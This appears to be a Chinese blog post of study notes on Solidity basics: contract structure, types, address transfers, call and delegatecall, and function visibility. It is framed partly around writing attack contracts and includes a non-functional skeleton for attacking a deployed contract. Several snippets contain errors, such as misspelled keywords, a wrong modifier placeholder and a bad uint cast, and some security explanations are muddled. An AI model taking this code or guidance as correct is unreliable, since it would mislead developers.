<!DOCTYPE html>
<html lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <link rel="stylesheet" href="/style/style.css">
<script>
  var nlviconfig = {
    title: "dyf",
    author: "dyf",
    baseUrl: "/",
    theme: {
      scheme: "banderole",
      lightbox: true,
      animate: true,
      search: true,
      friends: false,
      reward: false,
      lazy: false
    }
  }
</script>




    <link rel="stylesheet" href="/script/lib/lightbox/css/lightbox.min.css">




    <link rel="stylesheet" href="/syuanpi/syuanpi.min.css">











<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="browsermode" content="application">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="dyf">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="msapplication-navbutton-color" content="#666666">
<meta name="format-detection" content="telephone=no">
<meta name="keywords" content="nlvi, Nlvi">





  <title>
  dyf
  
</title>
</head>
<body>
  <div class="progress">
  <div class="progress-inner"></div>
</div>

  
    <div class="tagcloud-mask"></div>  
<div class="tagcloud" id="tagcloud">
  <div class="tagcloud-inner">
    <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
  </div>
</div>
  

  <div class="container" style="display:none;">

    <header class="header" id="header">
  <div class="header-wrapper">
    <div class="logo">
  <div class="logo-inner syuanpi tvIn">
    <span><a href="/">dyf</a></span>
    
  </div>
</div>
    <nav class="main-nav">
  
  <ul class="main-nav-list syuanpi tvIn">
  
    <li class="menu-item">
      <a href="javascript:;" id="search">
        <span>Search</span>
        
          <span class="menu-item-label">search</span>
        
      </a>
    </li>
  
  
    
      
    
    <li class="menu-item">
      <a href="/" id="article">
        <span class="base-name">Articles</span>
        
          <span class="menu-item-label">article</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/archives" id="archives">
        <span class="base-name">Archives</span>
        
          <span class="menu-item-label">archives</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="javascript:;" id="tags">
        <span class="base-name">Tags</span>
        
          <span class="menu-item-label">tags</span>
        
      </a>
    </li>
  
    
      
    
    <li class="menu-item">
      <a href="/about" id="about">
        <span class="base-name">About</span>
        
          <span class="menu-item-label">about</span>
        
      </a>
    </li>
  
  </ul>
  
</nav>

    
    
  </div>
</header>
<div class="mobile-header">
  <div class="mobile-header-body">
    <div class="mobile-header-list">
      
        
            <div class="mobile-nav-item">
                <a href="/">
                    <span>Articles</span>
                    
                    
                </a>
            </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/archives">
                    <span>Archives</span>
                    
                    
                </a>
            </div>
        
      
        
          <div class="mobile-nav-item inner-cloud">
            <div class="mobile-nav-tag">
              <a href="javascript:;" id="mobile-tags">
                <span>Tags</span>
                
                
              </a>
            </div>
            <div class="mobile-nav-tagcloud">
              <div class="mobile-tagcloud-inner">
                <a href="/tags/solo/" style="font-size: 14px;">solo</a> <a href="/tags/thinking/" style="font-size: 14px;">thinking</a> <a href="/tags/tutorial/" style="font-size: 14px;">tutorial</a>
              </div>
            </div>
          </div>
        
      
        
            <div class="mobile-nav-item">
                <a href="/about">
                    <span>About</span>
                    
                    
                </a>
            </div>
        
      
    </div>
  </div>
  <div class="mobile-header-nav">
    <div class="mobile-header-item" id="mobile-left">
      <div class="header-menu-item">
        <span class="header-menu-line"></span>
      </div>
    </div>
    <h1 class="mobile-header-title">
      <a href="/">dyf</a>
    </h1>
    <div class="mobile-header-item"></div>
  </div>
</div>
    <div class="container-inner">

    <h1 style="
    text-align:center;
    font-family:cathsgbr;
    color: #FC5185;
    font-weight:500;
    font-size:30px;
    ">The dyf's blog</h1>

      <main class="main" id="main">
        <div class="main-wrapper">
          
  

<section class="posts">
  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-28</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/28/solidity文档整理/">solidity文档整理</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="文档整理"><a href="#文档整理" class="headerlink" title="文档整理"></a>文档整理</h3><hr>
<h4 id="1-合约的结构"><a href="#1-合约的结构" class="headerlink" title="1. 合约的结构"></a>1. 合约的结构</h4><ul>
<li>状态变量(State Variable)  </li>
</ul>
<p>&emsp;&emsp;状态变量指的是那些直接声明在函数外的变量，他们被永久的储存在合约里。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage&#123;</span><br><span class="line">    uint storedData;	<span class="comment">//State variable</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数(Function)  </li>
</ul>
<p>&emsp;&emsp;solidity里的函数与Javascript极为相似，但是包含更多的修饰词和可见性限制,也可以有多个返回值。  </p>
<ul>
<li>函数修改器(Function Modifier)  </li>
</ul>
<p>&emsp;&emsp;函数修改器主要是以声明的形式来修改函数的语义，比如给函数的出发增加限制条件或者验证。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line">contract Purchase&#123;</span><br><span class="line">    address public seller;</span><br><span class="line">    </span><br><span class="line">    modifier onlySeller() &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == seller,<span class="string">"only seller can call this"</span>);</span><br><span class="line">        -;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">abort</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">onlySeller</span></span>&#123;	<span class="comment">// Modidier usage</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>事件(Event)  </li>
</ul>
<p>&emsp;&emsp;事件是<strong>EVM logging</strong>的便利接口。当事件被触发时，可将部分数据记录到区块链上。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction&#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); <span class="comment">//Event</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bid</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        emit HighestBidIncreased(msg.sender,msg.value); <span class="comment">//Triggering event</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结构(Struct)  </li>
</ul>
<p>&emsp;&emsp;结构体与c语言极为相似  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Ballot&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Voter</span>&#123;</span> <span class="comment">// Struct</span></span><br><span class="line">        uint weight;</span><br><span class="line">        <span class="keyword">bool</span> voted;</span><br><span class="line">        address delegate;</span><br><span class="line">        uint vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举(Enum)  </li>
</ul>
<p>&emsp;&emsp;枚举与C++中的枚举类似，都是自定义类型，你可以认为这是一个常量集合。  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    <span class="keyword">enum</span> State &#123;</span><br><span class="line">        Created, Locked, Inactive		<span class="comment">//Enum</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h4><ul>
<li>布尔(Booleans)  </li>
</ul>
<p>&emsp;&emsp;与通常的语言一样，<strong>bool</strong> 包含 <strong><em>true</em></strong> 和 <strong><em>false</em></strong> 两种常量。  </p>
<p><strong>Operators</strong>:  </p>
<ol>
<li><strong>!</strong>  非  </li>
<li><strong>&amp;&amp;</strong> 与  </li>
<li><strong>||</strong>  或  </li>
<li><strong>==</strong>  等于  </li>
<li><strong>!=</strong>  不等于  </li>
</ol>
<blockquote>
<p><strong>||</strong> 和 <strong>&amp;&amp;</strong> 遵守短路定律，这意味着表达式  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(x) || g(y)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果f(x)为真，g(y)将不参与运算，尽管这可能有副作用。  </p>
<ul>
<li>整数(Integers)  </li>
</ul>
<p>&emsp;&emsp;<strong>int</strong> / <strong>uint</strong> 分别是有符号和无符号整数，他们具有可变的内存体积。关键字uint8到uint256与int8到uint8相对应。数字后缀代表的是变量的内存大小，uint8指的是<strong>8bits</strong>的无符号整数。并且uint与int是uint256与int256的别名(alias)。  </p>
<p><strong>Operator</strong>:  </p>
<ol>
<li>比较： <strong>&lt;= , &lt; , == , != , &gt;= , &gt;</strong> (表达式的值为bool)</li>
<li>位运算： &amp; , | , ^ , ~  </li>
<li>移位运算： &lt;&lt; , &gt;&gt;  </li>
<li>算数运算： +  ,  -   ,  *  ,  /  </li>
</ol>
<blockquote>
<p>整数的大小范围在solidity中十分严格，例如uint32代表0到2**32 - 1之间的数，如果结果超出这个范围，那么可能造成上溢或者下溢，这可能会给合约造成严重的安全隐患。  </p>
</blockquote>
<ul>
<li>地址(Address)  </li>
</ul>
<p>&emsp;&emsp;地址类型是较为特殊的变量类型，这中变量对应一个合约或者账户(本质上合约就是一个账户)，他主要包含两种风格：  </p>
<blockquote>
<p>address: 包含20byte的值  （以太坊地址）<br>address payable: 与address一样，但是包含transfer和send两个成员  </p>
</blockquote>
<p>&emsp;&emsp;两者的主要区别是，后者可以就收以太币(Ether)，但是address却不能，这里一定要注意，尤其是在写攻击合约的时候。  </p>
<p>&emsp;&emsp;address payable 到 address的隐式转换是允许的，但是反过来却不行，地址字面量能够被隐式的转换为address payable  </p>
<p>&emsp;&emsp;int 整数字面量(integer literals) bytes20以及合约 类型都可以被被显式的转换为address类型。  </p>
<blockquote>
<p>int 字面量 和bytes20 想要转换为address payable必须满足地址本身代表的合约或者账户的fallback(回滚)函数必须是payable的。当然，如果address变量的fallback函数是payable的，那么显式的转换也是可以的。</p>
</blockquote>
<blockquote>
<p>warning:</p>
<blockquote>
<p>如果你想要将一个大的bytes类型转换为地址，比如bytes32,这个时候address会截尾，为了避免二义性，你必须显式的自行进行截断的选择。</p>
</blockquote>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="number">0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC</span>;</span><br><span class="line"></span><br><span class="line">address(uint160(bytes20(b))) 		<span class="comment">//这时结果为0x111122223333444455556666777788889999aAaa</span></span><br><span class="line"></span><br><span class="line">address(uint169(uint256(b)))		<span class="comment">//这时结果为0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc</span></span><br></pre></td></tr></table></figure>
<ul>
<li>地址的成员(Members of Address)  </li>
</ul>
<p>&emsp;&emsp;上面提到balance和transfer是address payable类型的两个成员。  </p>
<p>&emsp;&emsp;如果地址是payable的，那么我们可以查询地址剩余的Ether或者向他打钱，例如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address payable x = address(<span class="number">0x123</span>);</span><br><span class="line">address myAddress = address(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(x.balance &lt; <span class="number">10</span> &amp;&amp; myAddress.balance &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">	x.transfer(<span class="number">10</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个时候我们就向x地址打了10块钱，balance实际上是调用了成员对象本身的getter()函数，getter能够返回一个状态变量的值。  </p>
<blockquote>
<p>transfer函数将会在ether不足或者对方拒绝收钱时执行失败，这个时候transfer()将会回滚，注意这里很重要，有转账功能的还有send()函数和<address>.call.value()()函数，后两者在失败时转出的钱不会回滚，这就有可能导致Reentrancy漏洞。  </address></p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">处理</th>
<th style="text-align:left">消耗</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><address>.transfer()</address></td>
<td style="text-align:left">失败时抛出异常，并且回滚状态</td>
<td style="text-align:left">消耗2300 Gas (not adjustable) 可防止回滚</td>
</tr>
<tr>
<td style="text-align:left"><address>.send()</address></td>
<td style="text-align:left">失败时返回错误</td>
<td style="text-align:left">消耗2300 Gas (not adjustable) 不防止回滚</td>
</tr>
<tr>
<td style="text-align:left"><address>.call.value().gas()()</address></td>
<td style="text-align:left">失败时返回错误</td>
<td style="text-align:left">消耗Gas可调节 不防止回滚</td>
</tr>
</tbody>
</table>
<blockquote>
<p><address>.send()与<address>.call.value()()函数在转账过程中发生异常时，不能有效回滚，导致Reentrancy的攻击无法防御，因此我们在交易时应当使用transfer()函数。</address></address></p>
</blockquote>
<blockquote>
<p>关于call()  delegatecall()   staticcall()<br>为了不依赖于ABI来调用合约的接口，或者更为直接的调用其他合约的方法，solidity提供了call，delegatecall，staticcall。他们都接受一个<strong>bytes memory</strong>类型的参数，并且返回bool类型和被调用方法的返回值。方法abi.encode,abi.encodePacked,abi.encodeWithSelector以及abi.encodeWithSignature 可以被用来将数据编码结构化。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bytes memory payload = abi.encodeWithSignature(<span class="string">"register(string)"</span>,<span class="string">"MyName"</span>);</span><br><span class="line"></span><br><span class="line">(bool success, bytes memory returnData) = address(nameReg).call(payload);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(success);</span><br></pre></td></tr></table></figure>
<h4 id="关于call-与delegatecall-的区别："><a href="#关于call-与delegatecall-的区别：" class="headerlink" title="关于call()与delegatecall()的区别："></a>关于call()与delegatecall()的区别：</h4><p>&emsp;&emsp;这里要强调一下call与delegatecall可能导致的问题，两者都是底层调用，但是两者的上下文不同，call所代表的上下文是被调用合约实例本身，而delegatecall则是该方法调用的发起者。</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/eth_writeUp0.png?raw=true" alt="delegatecall">  </p>
<p>&emsp;&emsp;因此这时候我们应当注意状态的转换，尽量少的使用底层调用。  </p>
<blockquote>
<p>注：<br>作为底层调用，如果你调用了任何未知的恶意合约，相当于你将控制权交给了他，这有可能导致该恶意合约回调你的合约，所以你的合约状态变量可能会被恶意修改。通常情况下我们应当创建一个合约实例,如: x.f()</p>
</blockquote>
<p>&emsp;&emsp;call()的用法实例：  </p>
<ol>
<li>通过gas()函数修改器来调整Gas  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call.gas(<span class="number">1000000</span>)(abi.encodeWithSignature(<span class="string">"register(string)"</span>, <span class="string">"MyName"</span>));</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>通过value()函数修改器来调整Ether：  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call.value(<span class="number">1</span> ether)(abi.encodeWithSignature)(<span class="string">"register(string)"</span>,<span class="string">"MyName"</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>这两种函数修改器可以结合：  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call.gas(<span class="number">1000000</span>).value(<span class="number">1</span> ether)(abi.encodeWithSignature(<span class="string">"register(string)"</span>, <span class="string">"MyName"</span>));</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;类似地，函数delegatecall也可以被如此调用，区别是：此函数只使用给定地址的代码，其他方面比如(storage,balance…)都是当前调用合约，这一点上面我们说过了。使用delegatecall的目的主要是使用其他合约的library中的方法。但是用户需要确定两合约的内存布局适合是的。  </p>
<p>&emsp;&emsp;对于staticcall，他与call十分相似，但这个方法会revert(恢复调用前状态)如果被调用方法修改了状态变量。</p>
<blockquote>
<p>delegatecall()不支持value()修改器  </p>
</blockquote>
<blockquote>
<p>所有的合约都能被显式转换为地址，因此可以使用address(this).balance来查看当前合约的存款。  </p>
</blockquote>
<hr>
<ul>
<li>合约类型(Contract)  </li>
</ul>
<p>&emsp;&emsp;与C++类似，每种合约都是一种数据类型，子类合约可以隐式的转换为父类或超类合约，并且能够显式的转换为address类型。  </p>
<p>&emsp;&emsp;与address类似，只有fallback函数是payable的合约才能转化为address payable。转换的方式依旧是<strong>address(contract)</strong> 而不是 <strong>address payable(contract)</strong>.  </p>
<p>&emsp;&emsp;你可以声明一个合约类型的局部变量，那么你就可以调用那个合约的方法，如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract A &#123;</span><br><span class="line">	uint x;</span><br><span class="line">    contrusctor(uint a) internal&#123;</span><br><span class="line">        x = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    A a = A(<span class="number">2</span>);			<span class="comment">//调用了A的构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echoA</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.x();		<span class="comment">//返回a.x的值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;但是假如你想要调用已经存在的一个实例，比如想要攻击已经在链上的一个合约，这个时候你可以：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Fuck &#123;</span><br><span class="line">	address target_contract_addr = <span class="string">"0x123"</span>;		<span class="comment">//首先获得攻击目标的地址</span></span><br><span class="line">    </span><br><span class="line">    TargetContract x = TargetContract(target_contract_addr);		<span class="comment">//将地址注入构造函数</span></span><br><span class="line">    </span><br><span class="line">    x.balance();		<span class="comment">//进行你想做的攻击</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>你可以用type(c)来获得c合约的类型。  </p>
</blockquote>
<hr>
<ul>
<li>定长数组(Fixed-size byte arrays)  </li>
</ul>
<p>&emsp;&emsp;bytes1到bytes32能储存一列数，数组长度是从1到32，byte是byte1的alias。  </p>
<p>Operator：  </p>
<ol>
<li>比较 &lt;= , &lt; , == , != , &gt;= , &gt; 结果返回bool  </li>
<li>位运算： &amp; , | , ^ , ~   </li>
<li>移位运算： &lt;&lt; , &gt;&gt;  </li>
<li>寻址运算： x[k] 获得数组x的第i+1个数据  </li>
</ol>
<blockquote>
<p>成员对象.length是只读的，不可修改  </p>
</blockquote>
<ul>
<li>变长数组(Dynamically-sized byte array)  </li>
</ul>
<p>&emsp;&emsp;bytes是动态大小的数组，不是值类型。<br>&emsp;&emsp;string是UTF-8-encode 的string类型，不是值类型。  </p>
<hr>
<ul>
<li>字面量(Literals)  </li>
</ul>
<p>&emsp;&emsp;字面量包括地址字面量(Address Literals)，字符串字面量(String Literals)和有理字面量(Rational Literals)以及整数字面量(Interege Literals),通俗来讲字面量就是常数，而且其精度无限(与其本身长度有关)，但是当字面两转化为非字面量时，精度可能会损失。  </p>
<blockquote>
<p>5/2对于字面量来说是2.5，而对于uint来说是2。字面量参与非字面量进行运算时，其类型必须相同，如:  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uint128 a = <span class="number">1</span>;</span><br><span class="line">uint128 b = <span class="number">2.5</span> + a;		<span class="comment">//这样写是会报错的</span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>函数(Function)  </li>
</ul>
<p>&emsp;&emsp;函数的用法与js极为相似，只是有些可见性关键字需要解释一下，首先来看一下声明格式：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">&lt;parameter types&gt;</span>) </span>&#123;internal|external&#125; [pure|view|payable] [<span class="xml"><span class="tag">&lt;<span class="name">returns</span> <span class="attr">types</span>&gt;</span>]</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;函数中假如有返回值，则返回值的类型不能省略，如果返回值缺省，那么整个<strong>returns()</strong>的部分都应该省略。  </p>
<p>&emsp;&emsp;默认情况下函数的可见性是internal，但是我自己在尝试时发现，如果可见性关键字缺省则会导致报错。  </p>
<p>&emsp;&emsp;下面我们来解释一下可见性与访问控制的问题：  </p>
<p>&emsp;&emsp;函数的可见性分为四种：<strong>public private internal external</strong> .</p>
<h4 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h4><p>&emsp;&emsp;internal调用，实现时转为简单的EVM跳转，所以他能够直接访问上下文的数据，对于引用传递是十分高效，例如memory之间的值传递，实际上是引用的传递(妈耶，storage和memory又是坑，不同版本真是令人窒息)。  </p>
<p>&emsp;&emsp;当前代码单元内，比如同一个合约内的函数，引入的library库，以及父类函数的直接调用即为internal调用，比如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) <span class="title">internal</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">        a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在上述代码中的b()对a()的调用即为internal方式调用，函数在不显式声明访问类型时,以目前的版本来看会报错。</p>
<h4 id="external"><a href="#external" class="headerlink" title="external"></a>external</h4><p>&emsp;&emsp;external调用实现了合约的外部消息调用。所以合约在初始化时不能以external的方式调用自身函数，因为此时合约仍未构造完成，此处可类比struct类型，一个结构体不能包含自身对象。但是可以以this的方式强制进行external调用。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">a</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        a();  <span class="comment">//此时会报错</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contract ext&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">callA</span>(<span class="params">test tmp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">            tmp.a();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="public"><a href="#public" class="headerlink" title="public"></a>public</h4><p>&emsp;&emsp;public的特点是，函数既可以以internal方式调用，也可以用internal方式调用。public函数可以被外部接口访问，是合约对外接口的一部分。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    funciton fun2() public &#123;</span><br><span class="line">        fun1();</span><br><span class="line">        <span class="keyword">this</span>.fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;可以看到没有报错，既然public这么舒服，那为啥我还要用external？？？  </p>
<p>&emsp;&emsp;经过对比后我们可以发现，external方法消耗的gas要比public少，因为Solidity在调用public函数时会将代码复制到EVM的内存中，而external则是以calldata的方式进行调用的。内存分配在EVM中是十分宝贵的，而读取calldata则十分廉价，因此在处理大量外部数据，并反复调用函数时，应当考虑用external方法。  </p>
<p>&emsp;&emsp;这里应当注意的是，public属于可见性。函数的可见性分为四种：<strong>public private internal external</strong> .  </p>
<h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><p>&emsp;&emsp;对于private，与internal的区别是，private的方法在子类中无法调用，即使被声明为private也不能阻止数据的查看。访问权限仅仅是限制其他合约对函数的访问和数据修改的权限。而private方法也默认以internal的方式调用。  </p>
